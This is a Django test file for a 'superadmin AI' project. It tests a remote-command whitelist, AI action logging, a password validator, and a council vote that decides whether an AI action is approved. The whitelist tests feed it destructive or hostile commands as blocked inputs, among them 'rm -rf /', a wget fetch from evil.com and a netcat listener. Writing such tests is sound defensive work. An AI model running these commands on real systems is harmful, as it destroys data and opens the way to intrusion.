"""Superadmin AI + Security tests."""

import json

from django.contrib.auth import get_user_model
from django.test import TestCase

User = get_user_model()


class RemoteApiSecurityTest(TestCase):
    """Test remote_api.py command whitelist."""

    def test_blocked_rm_rf(self):
        from core.remote_api import _is_safe

        safe, reason = _is_safe("rm -rf /")
        self.assertFalse(safe)

    def test_blocked_chmod_777(self):
        from core.remote_api import _is_safe

        safe, reason = _is_safe("chmod 777 /var/www")
        self.assertFalse(safe)

    def test_blocked_wget(self):
        from core.remote_api import _is_safe

        safe, reason = _is_safe("wget http://evil.com/payload")
        self.assertFalse(safe)

    def test_blocked_netcat(self):
        from core.remote_api import _is_safe

        safe, reason = _is_safe("nc -l 4444")
        self.assertFalse(safe)

    def test_chained_rm_blocked(self):
        from core.remote_api import _is_safe

        safe, reason = _is_safe("ls ; rm -rf /")
        self.assertFalse(safe)

    def test_safe_manage_py(self):
        from core.remote_api import _is_safe

        safe, reason = _is_safe("python manage.py check")
        self.assertTrue(safe)
        self.assertEqual(reason, "whitelisted")

    def test_safe_grep(self):
        from core.remote_api import _is_safe

        safe, reason = _is_safe('grep -n "class" documents/models.py')
        self.assertTrue(safe)

    def test_safe_cat(self):
        from core.remote_api import _is_safe

        safe, reason = _is_safe("cat manage.py")
        self.assertTrue(safe)


class AIActionLogTest(TestCase):
    """Test AIActionLog model."""

    def test_create_log(self):
        from superadmin_ai.models import AIActionLog

        log = AIActionLog.objects.create(
            module="test_module",
            action_type="test_action",
            access_level=1,
            outcome="executed",
            details={"test": True},
        )
        self.assertIsNotNone(log.pk)
        self.assertEqual(log.module, "test_module")

    def test_log_str(self):
        from superadmin_ai.models import AIActionLog

        log = AIActionLog.objects.create(
            module="arhiva_monitor",
            action_type="anomaly_detection",
            access_level=3,
            outcome="executed",
            details={},
        )
        self.assertIn("arhiva_monitor", str(log))


class PasswordValidatorTest(TestCase):
    """Test StrongPasswordValidator."""

    def test_no_uppercase_rejected(self):
        from django.core.exceptions import ValidationError

        from core.validators import StrongPasswordValidator

        v = StrongPasswordValidator()
        with self.assertRaises(ValidationError):
            v.validate("alllowercase1!")

    def test_no_number_rejected(self):
        from django.core.exceptions import ValidationError

        from core.validators import StrongPasswordValidator

        v = StrongPasswordValidator()
        with self.assertRaises(ValidationError):
            v.validate("NoNumberHere!")

    def test_no_special_rejected(self):
        from django.core.exceptions import ValidationError

        from core.validators import StrongPasswordValidator

        v = StrongPasswordValidator()
        with self.assertRaises(ValidationError):
            v.validate("NoSpecial123")

    def test_strong_password_ok(self):
        from core.validators import StrongPasswordValidator

        v = StrongPasswordValidator()
        v.validate("SecurePass1!")  # Should not raise


class CouncilTest(TestCase):
    @classmethod
    def setUpTestData(cls):
        cls.superuser = User.objects.create_superuser("council_admin", "council@test.com", "Test123!")

    def test_council_needs_two_thirds(self):
        from superadmin_ai.models import AICouncilVote, PendingAIAction

        pending = PendingAIAction.objects.create(
            module="finance",
            action_type="write",
            description="Test council",
            status="pending",
        )
        # 1 glas — nedovoljno
        AICouncilVote.objects.create(pending_action=pending, agent="claude_haiku", vote="approve", confidence=80)
        self.assertEqual(AICouncilVote.get_decision(pending), "pending")
        # 2 glasova ZA — odobreno
        AICouncilVote.objects.create(pending_action=pending, agent="claude_sonnet", vote="approve", confidence=90)
        self.assertEqual(AICouncilVote.get_decision(pending), "approved")

    def test_council_rejects_on_majority_against(self):
        from superadmin_ai.models import AICouncilVote, PendingAIAction

        pending = PendingAIAction.objects.create(
            module="finance",
            action_type="delete",
            description="Test reject",
            status="pending",
        )
        AICouncilVote.objects.create(pending_action=pending, agent="claude_haiku", vote="reject", confidence=95)
        AICouncilVote.objects.create(pending_action=pending, agent="claude_sonnet", vote="reject", confidence=90)
        self.assertEqual(AICouncilVote.get_decision(pending), "rejected")

    def test_council_no_consensus_rejects(self):
        from superadmin_ai.models import AICouncilVote, PendingAIAction

        pending = PendingAIAction.objects.create(
            module="pos",
            action_type="exec",
            description="Test no consensus",
            status="pending",
        )
        AICouncilVote.objects.create(pending_action=pending, agent="claude_haiku", vote="approve", confidence=60)
        AICouncilVote.objects.create(pending_action=pending, agent="claude_sonnet", vote="reject", confidence=70)
        AICouncilVote.objects.create(pending_action=pending, agent="gemini_flash", vote="abstain", confidence=50)
        self.assertEqual(AICouncilVote.get_decision(pending), "rejected")

    def test_council_level_exists(self):
        from superadmin_ai.models import AIModulePermission

        self.assertEqual(AIModulePermission.ACCESS_COUNCIL, 4)

    def test_live_metrics_endpoint(self):
        self.client.force_login(self.superuser)
        resp = self.client.get("/superadmin/ai/api/live-metrics/", follow=True)
        self.assertEqual(resp.status_code, 200)
        data = json.loads(resp.content)
        self.assertIn("autonomous_today", data)
        self.assertIn("pending_count", data)
        self.assertIn("blocked_today", data)
        self.assertIn("council_votes", data)
